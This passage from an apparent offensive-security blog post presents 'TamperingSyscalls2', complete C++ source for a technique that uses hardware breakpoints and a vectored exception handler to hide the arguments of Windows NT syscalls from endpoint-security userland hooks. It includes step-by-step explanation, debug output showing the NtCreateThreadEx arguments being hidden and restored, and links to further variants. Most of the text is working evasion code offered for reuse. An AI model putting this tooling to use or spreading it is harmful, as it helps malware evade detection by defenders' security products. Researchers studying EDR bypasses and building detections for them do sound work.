on the stack may produce undesirable behaviour.

Our call stack should already originate from a suitable DLL, and thus you shouldn't need
to call the Native functions and can call a suitable wrapper from any DLL provided you 
call the constructor with the Native function address in NTDLL. 

This is trivial and can be achieved by changing the macro:
#define STK_ARGS 8		// 12 - 4 = 8 - should cover most Nt functions. 

In the example, we show it working with NtCreateThreadEx and NtCreateMutant! Make sure
you are only using the 4 debug registers individually per thread. Once you are done with
a specific function, you can free up the associated debug register by calling the
RemoveHWBPS method. 

1. If (addr == entry.first) this means we are the the mov r10, rcx instruction 
 - We store our arguments in our hashmap entry using the key (TID | address)

const auto key = (address + 0x12) | GetCurrentThreadId();

SYSCALL_MAP[key].Rcx = ExceptionInfo->ContextRecord->Rcx;
SYSCALL_MAP[key].Rdx = ExceptionInfo->ContextRecord->Rdx;
SYSCALL_MAP[key].R8 = ExceptionInfo->ContextRecord->R8;
SYSCALL_MAP[key].R9 = ExceptionInfo->ContextRecord->R9;

for (size_t idx = 0; idx < STK_ARGS; idx++)
{
	const size_t offset = idx * 0x8 + 0x28;
	SYSCALL_MAP[key].stk[idx] =
		*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset);
}
 - We then set these argument values to 0 (can be any other arbitrary value) 

ExceptionInfo->ContextRecord->Rcx = 0;
ExceptionInfo->ContextRecord->Rdx = 0;
ExceptionInfo->ContextRecord->R8 = 0;
ExceptionInfo->ContextRecord->R9 = 0;
// ...

 - We then set the Resume Flag in bit 16 and Trap Flag in bit 8
 - This will continue execution, as usual, only minimally affecting the performance. 
 
ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Resume Flag
ExceptionInfo->ContextRecord->EFlags |= (1 << 8);	// Trap Flag

2. Keep single stepping until (addr == entry.second.sysc) 
 - We are now at the syscall instruction and have gone past any userland hooks 
 - We restore our arguments using the previous (TID | address) lookup key. 
```c
auto const key = (address | GetCurrentThreadId());

// mov rcx, r10 
ExceptionInfo->ContextRecord->R10 = SYSCALL_MAP[key].Rcx;
ExceptionInfo->ContextRecord->Rcx = SYSCALL_MAP[key].Rcx;	
ExceptionInfo->ContextRecord->Rdx = SYSCALL_MAP[key].Rdx;
ExceptionInfo->ContextRecord->R8 = SYSCALL_MAP[key].R8;
ExceptionInfo->ContextRecord->R9 = SYSCALL_MAP[key].R9;

for (size_t idx = 0; idx < STK_ARGS; idx++)
{
	const size_t offset = idx * 0x8 + 0x28;
	*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) =
		SYSCALL_MAP[key].stk[idx];
}
```
 - We will single step again.
 
3. We are now at  (address == ai.return_addr)
 - We can now stop single stepping and only set the Resume Flag (not Trap Flag)
 - This will continue execution, as usual, only minimally affecting the performance. 

The previously described technique is implemented, focusing on hiding ALL arguments of 
the MAJORITY of Native syscalls! And so enjoy this elegant and straightforward solution 
where I provide the debug print statements, too, so you can see the changes being made to 
the stack and registers and the thought processes behind it all. 

```C
//////////////////////////////////////////////////////////////////////////////////////////
/*                              TamperingSyscalls2.cpp - @rad9800                       */
/*                 C++ Generic x64 user-land evasion technique utilizing HWBP.cpp       */
/*                      Hides up to 12 args of up to 4 NT calls per thread              */
//////////////////////////////////////////////////////////////////////////////////////////
#include <windows.h>

#include <tlhelp32.h>
#include <functional>

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Structs                                     */
//////////////////////////////////////////////////////////////////////////////////////////

						// 12 - 4 = 8 - should cover most Nt functions. 
#define STK_ARGS 8			// Increase this value, works until ~100...

typedef struct {
	uintptr_t									syscall_addr;	// +0x12
	uintptr_t									 return_addr;	// +0x14
} ADDRESS_INFORMATION;

typedef struct {
	uintptr_t			Rcx;	// First
	uintptr_t			Rdx;	// Second
	uintptr_t			R8;		// Third
	uintptr_t			R9;		// Fourth
	uintptr_t			stk[STK_ARGS];	// Stack args
} FUNC_ARGS;

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Macros                                      */
////////////////////////////////////////////////////////////////////////////////////////// 
#define PRINT_ARGS( State, ExceptionInfo )                              \
printf("%s %d arguments and stack for 0x%p || TID : 0x%x\n",            \
    State, (STK_ARGS + 4), (PVOID)address, GetCurrentThreadId());       \
printf("1:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->Rcx);       \
printf("2:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->Rdx);       \
printf("3:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->R8);        \
printf("4:\t0x%p\n", (PVOID)(ExceptionInfo)->ContextRecord->R9);        \
for (UINT idx = 0; idx < STK_ARGS; idx++){                              \
    const size_t offset = idx * 0x8 + 0x28;                             \
    printf("%d:\t0x%p\n", (idx + 5), (PVOID)*(PULONG64)                 \
        ((ExceptionInfo)->ContextRecord->Rsp + offset));                \
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Globals                                     */
//////////////////////////////////////////////////////////////////////////////////////////
std::unordered_map<uintptr_t, ADDRESS_INFORMATION> ADDRESS_MAP{ 0 };
// syscall opcode { 0x55 } address, func args in registers and stack 
std::unordered_map<uintptr_t, FUNC_ARGS> SYSCALL_MAP{ 0 };

//////////////////////////////////////////////////////////////////////////////////////////
/*                                      Functions                                       */
//////////////////////////////////////////////////////////////////////////////////////////
VOID SetHWBP(const HANDLE thd, const uintptr_t address, const UINT pos, const bool init)
{
	CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	GetThreadContext(thd, &context);

	if (init) {
		(&context.Dr0)[pos] = address;

		context.Dr7 &= ~(3ull << (16 + 4 * pos));
		context.Dr7 &= ~(3ull << (18 + 4 * pos));
		context.Dr7 |= 1ull << (2 * pos);
	}
	else {
		if ((&context.Dr0)[pos] == address) {
			context.Dr7 &= ~(1ull << (2 * pos));
			(&context.Dr0)[pos] = NULL;
		}
	}

	SetThreadContext(thd, &context);
}

// Find our ret ROP gadget (pointer decay so need explicit size)
uintptr_t FindRopAddress(const uintptr_t function, const BYTE* stub, const UINT size)
{
	for (unsigned int i = 0; i < (unsigned int)25; i++)
	{
		// memcmp WILL be optimized 
		if (memcmp((LPVOID)(function + i), stub, size) == 0) {
			return (function + i);
		}
	}
	return NULL;
}

DWORD WINAPI TestThread(LPVOID lpParameter);

//////////////////////////////////////////////////////////////////////////////////////////
/*                                        Classes                                       */
//////////////////////////////////////////////////////////////////////////////////////////
struct TS2_HWBP {
private:
	const uintptr_t address;
	UINT			pos;
public:
	TS2_HWBP(const uintptr_t address, const UINT idx) : address{ address },
		pos{ idx % 4 }
	{
		SetHWBP(GetCurrentThread(), address, pos, true);

		BYTE syscop[] = { 0x0F, 0x05 };
		ADDRESS_MAP[address].syscall_addr =
			FindRopAddress(address, syscop, sizeof(syscop));
		BYTE retnop[] = { 0xC3 };
		ADDRESS_MAP[address].return_addr =
			FindRopAddress(address, retnop, sizeof(retnop));
	};

	VOID RemoveHWBPS()
	{
		SetHWBP(GetCurrentThread(), address, pos, false);
	}

	~TS2_HWBP()
	{
		RemoveHWBPS();
	}
};

//////////////////////////////////////////////////////////////////////////////////////////
/*                                      Exception Handler                               */
//////////////////////////////////////////////////////////////////////////////////////////
LONG WINAPI ExceptionHandler(const PEXCEPTION_POINTERS ExceptionInfo)
{
	const auto address = ExceptionInfo->ContextRecord->Rip;
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{
		for (const auto& [syscall_instr, ai] : ADDRESS_MAP)
		{
			// check we are inside valid syscall instructions
			if ((address >= syscall_instr) && (address <= ai.return_addr)) {
				printf("0x%p >= 0x%p\n", (PVOID)address, (PVOID)syscall_instr);
				printf("0x%p <= 0x%p\n", (PVOID)address, (PVOID)ai.return_addr);

				if (address == syscall_instr) // mov r10, rcx
				{
					const auto key = (address + 0x12) | GetCurrentThreadId();

					SYSCALL_MAP[key].Rcx = ExceptionInfo->ContextRecord->Rcx;
					SYSCALL_MAP[key].Rdx = ExceptionInfo->ContextRecord->Rdx;
					SYSCALL_MAP[key].R8 = ExceptionInfo->ContextRecord->R8;
					SYSCALL_MAP[key].R9 = ExceptionInfo->ContextRecord->R9;

					for (size_t idx = 0; idx < STK_ARGS; idx++)
					{
						const size_t offset = idx * 0x8 + 0x28;
						SYSCALL_MAP[key].stk[idx] =
							*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset);
					}

					PRINT_ARGS("HIDING", ExceptionInfo);

					ExceptionInfo->ContextRecord->Rcx = 0;
					ExceptionInfo->ContextRecord->Rdx = 0;
					ExceptionInfo->ContextRecord->R8 = 0;
					ExceptionInfo->ContextRecord->R9 = 0;

					for (size_t idx = 0; idx < STK_ARGS; idx++)
					{
						const size_t offset = idx * 0x8 + 0x28;
						*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = 0ull;
					}

					PRINT_ARGS("HIDDEN", ExceptionInfo);

					ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Resume Flag
				}
				else if (address == ai.syscall_addr)
				{
					auto const key = (address | GetCurrentThreadId());

					// SSN in ExceptionInfo->ContextRecord->Rax

					// mov rcx, r10 
					ExceptionInfo->ContextRecord->R10 = SYSCALL_MAP[key].Rcx;
					ExceptionInfo->ContextRecord->Rcx = SYSCALL_MAP[key].Rcx;
					ExceptionInfo->ContextRecord->Rdx = SYSCALL_MAP[key].Rdx;
					ExceptionInfo->ContextRecord->R8 = SYSCALL_MAP[key].R8;
					ExceptionInfo->ContextRecord->R9 = SYSCALL_MAP[key].R9;

					for (size_t idx = 0; idx < STK_ARGS; idx++)
					{
						const size_t offset = idx * 0x8 + 0x28;
						*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) =
							SYSCALL_MAP[key].stk[idx];
					}

					PRINT_ARGS("RESTORED", ExceptionInfo);

					SYSCALL_MAP.erase(key);
				}
				else if (address == ai.return_addr)
				{
					ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Resume Flag
					return EXCEPTION_CONTINUE_EXECUTION;
				}
				ExceptionInfo->ContextRecord->EFlags |= (1 << 8);	// Trap Flag
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Entry                                       */
//////////////////////////////////////////////////////////////////////////////////////////
int main()
{
	const PVOID handler = AddVectoredExceptionHandler(1, ExceptionHandler);

	TS2_HWBP TS2NtCreateThreadEx{
		(uintptr_t)(GetProcAddress(GetModuleHandleW(L"NTDLL.dll"),
		"NtCreateThreadEx")),
		0
	};

	for (unsigned int i = 0; i < 2; ++i) {
		HANDLE t = CreateThread(nullptr, 0, TestThread, nullptr, 0, nullptr);
		if (t) WaitForSingleObject(t, INFINITE);
	}

	TS2NtCreateThreadEx.RemoveHWBPS();

	if (handler != nullptr) RemoveVectoredExceptionHandler(handler);
}

DWORD WINAPI TestThread(LPVOID lpParameter)
{
	UNREFERENCED_PARAMETER(lpParameter);
	printf("\n----TestThread----\n\n");

	TS2_HWBP TS2NtCreateMutant{
		(uintptr_t)(GetProcAddress(GetModuleHandleW(L"NTDLL.dll"),
		"NtCreateMutant")),
		0
	};

	HANDLE m = CreateMutexA(NULL, TRUE, "rad98");
	if (m) CloseHandle(m);

	return 0;
}
//////////////////////////////////////////////////////////////////////////////////////////
/*                                          EOF                                         */
//////////////////////////////////////////////////////////////////////////////////////////
```

Here is an example output, showing the arguments for NtCreateThreadEx being hidden.
```
0x00007FFBDF485400 >= 0x00007FFBDF485400
0x00007FFBDF485400 <= 0x00007FFBDF485414
HIDING 12 arguments and stack for 0x00007FFBDF485400 || TID : 0x9ecc
1:      0x00000062618FF8D8
2:      0x00000000001FFFFF
3:      0x0000000000000000
4:      0xFFFFFFFFFFFFFFFF
5:      0x00007FF79FB01FA0
6:      0x0000000000000000
7:      0x0000000000000000
8:      0x0000000000000000
9:      0x0000000000000000
10:     0x0000000000000000
11:     0x00000062618FF9F0
12:     0x000001C700000000
HIDDEN 12 arguments and stack for 0x00007FFBDF485400 || TID : 0x9ecc
1:      0x0000000000000000
2:      0x0000000000000000
3:      0x0000000000000000
4:      0x0000000000000000
5:      0x0000000000000000
6:      0x0000000000000000
7:      0x0000000000000000
8:      0x0000000000000000
9:      0x0000000000000000
10:     0x0000000000000000
11:     0x0000000000000000
12:     0x0000000000000000
0x00007FFBDF485403 >= 0x00007FFBDF485400
0x00007FFBDF485403 <= 0x00007FFBDF485414
0x00007FFBDF485408 >= 0x00007FFBDF485400
0x00007FFBDF485408 <= 0x00007FFBDF485414
0x00007FFBDF485410 >= 0x00007FFBDF485400
0x00007FFBDF485410 <= 0x00007FFBDF485414
0x00007FFBDF485412 >= 0x00007FFBDF485400
0x00007FFBDF485412 <= 0x00007FFBDF485414
RESTORED 12 arguments and stack for 0x00007FFBDF485412 || TID : 0x9ecc
1:      0x00000062618FF8D8
2:      0x00000000001FFFFF
3:      0x0000000000000000
4:      0xFFFFFFFFFFFFFFFF
5:      0x00007FF79FB01FA0
6:      0x0000000000000000
7:      0x0000000000000000
8:      0x0000000000000000
9:      0x0000000000000000
10:     0x0000000000000000
11:     0x00000062618FF9F0
12:     0x000001C700000000
0x00007FFBDF485414 >= 0x00007FFBDF485400
0x00007FFBDF485414 <= 0x00007FFBDF485414

----TestThread----
[...]
```

TamperingSyscalls2 (Black Mass) - https://godbolt.org/z/4qrM6j9q7

TamperingSyscalls2 (updated) - https://godbolt.org/z/edf9v1Wj6

TamperingSyscalls2 (pure C) - https://godbolt.org/z/9va7YzEe9

The code shared should work for most syscalls, though you should test before usage. The
the only major limitation in the works presented is a dependency on hashmaps 
(std::unordered_map); this internally will call various native functions indirectly, such 
as NtAllocateVirtualMemory, preventing us from hooking them. This can be repurposed to 
work with x86 with minimal effort. 

In the future, you could modify the libraries to utilize single stepping, as shown in the 
last example. You would need to know when you want to stop single-stepping (an address 
or range) and do it as such. This can also be used for the PAGE_GUARD hooking. 

You could also replace `AddVectoredExceptionHandler` with:
`SetUnhandledExceptionFilter(ExceptionHandler);`


References:

[1] [https://learn.microsoft.com/en-us/windows/win32/debug/using-a-vectored-exception-handler](https://learn.microsoft.com/en-us/windows/win32/debug/using-a-vectored-exception-handler)

[2] [https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention)

[3] [https://unit42.paloaltonetworks.com/sockdetour/](https://unit42.paloaltonetworks.com/sockdetour/)

[4] [https://github.com/microsoft/Windows-classic-samples/tree/main/Samples/Win7Samples/netds/winsock/](https://github.com/microsoft/Windows-classic-samples/tree/main/Samples/Win7Samples/netds/winsock/)

[5] [https://fool.ish.wtf/2022/08/tamperingsyscalls.html](https://fool.ish.wtf/2022/08/tamperingsyscalls.html)

[6] [https://labs.withsecure.com/publications/spoofing-call-stacks-to-confuse-edrs](https://labs.withsecure.com/publications/spoofing-call-stacks-to-confuse-edrs)

With all that, I look to ending on a positive note; I hope you have understood the RAW
UNMATCHED power of hardware breakpoints!!! 

Greetz to jonas, hjonk, smelly, mez0, and the other geezers ;) 

```
                                                        .                                 
                                                        ~.          .                     
                                                        !~        :^.                     
                                                       ^77^    :~!7:                      
                                                     .~!^.     ~7!!                       
                                                    :!:       :7^.                        
                                                   ~!.       ~!     ...:^~.               
                                                  !7.      .!^      !!!~:                 
                                                 ~7.      ^7:      .7~.                   
        .:^::.                                  .7!      !!        !~                     
     ....:::^~!~.                                !!:   .7^       .!^                      
             .:^~:.                              :!!:.^!.      .~7.                       
               ~^^~?^.                             :!!!~:::::^~7~                         
               .^:~!7!^.                           ^7^:^~~~~~^:                           
                 :^~^:~7~.                       .77~                                     
                 :~~:^^~~!!:                    :~~.                -your mate     
				 .!7~:::~!~~!!^                 .!^.       ^^.       		rad   
                !?^^.::^~~~777!~.             ^7.           .^~^:                         
              ^??~^:.:::^~~~!!~!7!!^.       .!!               .~98.            ...^~~~^:  
          .~7JJ~:^::::::^~~^~~!!~!7JY?^.:...::           ::    .~?5:        .?G5Y7!:      
    .:^7JJ777^^~~~~~^^^:^!~~~!7???J7~:^^::....           ...  . ^!7.^:.:~  JBYJ~.         
 .^?5J!~^~~~^^^:::^~~~~~^~~~~!!77??:.^::::....~^::...   .: ::~7!.:~^^::^^ ?B7:: .....     
~^^~!!!^^~~!!77777~~~~!~!!777????!::..:.. . .^~!!77~~!~^~^ .:. ...^~:  . !B7. ~~::.       
:.    .^!?7:::^^^!!7??J?7!!!!7?7:::.  ... .^!77!~^:~!!~:~.       ..:     J?   ...      .^~
        .^!J:^~^^:::^~7?YYYJ7!!..:.  :^^^~77?777!~::^^  .    . .......  ..   .. ...:~~~!!~
         .~~?:^^^^:^^^~^^~!7!~7!:. .^:^777!7??7!!!^:~:   .   .  ....::.....    .^~~~^^~^~^
          ^^7^^!~^^~^^~~~:.:..^!~:^^:~7??7????7!!~^:~:   .   ... ..........   .~J?7!~~^^^^
          .~!~^!^^^^^~^..:~^....:~~.^!7JYY5YJJ?77!:.^~   ..   .:..~..  ....   :5Y?7777~~~^
          :~7^^~^^~~~:..::^^:. :!^..:~!!!77???JJ?!^~~!!:.      .^::::.::^..: .~J?7~~^^^^^^
          ~!!.^~!!!^.::::...  ^~:..~7JJJ??777!~!!!!!~~~^.      .......^^^ ...!J?77!!77?7!~
         ^7!::~!!^:..:^::.. .~^...^~!77????77!~~~~^^!?!~.  .  ..  .::..:.  .^~7Y5YYYJ???!!
        ^?7::^^~!. :::::.  :~: ...    .....::::^^^~!!!^.     ....:!?~!7!. .^..:?5YYJ?777!!
       ~?7^^!!7!: ..:...  ^~::.:^~^:::....                      ..:::~!!..7JJYYYYJJJ??J?JJ
     :7!~::~~~~:  ...   .~^:.:::...^~^:::::......  .........        :!:  ~~!7??JJJJJ???777
  .:~^~~7!!77!!^       :^:................::....:::.....:.:..       :!: :77J?7!!7??77!~~~~
?J5~7~!!!77!!!!!~^:...~^.         ..     ........:^^^^:....:....    :!. .~?Y5YJ??J?7!~^^^^
~^::~!!!!!77!!~~~!7!~!^:^~~~~^:..             ....:::^^^::........  :~    .^?JJYJJ777!~^^^
      .^??~^!!~^^::~~~^:~!~~!77!!~^^^:.        .....::::^:..  ....  ^^   .. ..:7J5YJJ?!!~~
        .~J!~~~^^:~^::::^^^^!7!!~~~~!!^.        .. ...::^......... .^::..:...  .^755YJ???7
         .^7~^~:^!^:^:^^^^^~!!!!~~~~~~:.            .. ...:... .....:^^^:^:::    ^JYYY?!~~
           ^!~:~!~^:^^~~~!~~~~~~~!7!!~:      . .      .. .....  .:..:^^::::..    .?Y?!!!!~
           :!^~^^::::^~~^~~~~~~~!7!77~.  .  .    .     .       ......:::..    .   ^7!7?7~~
```

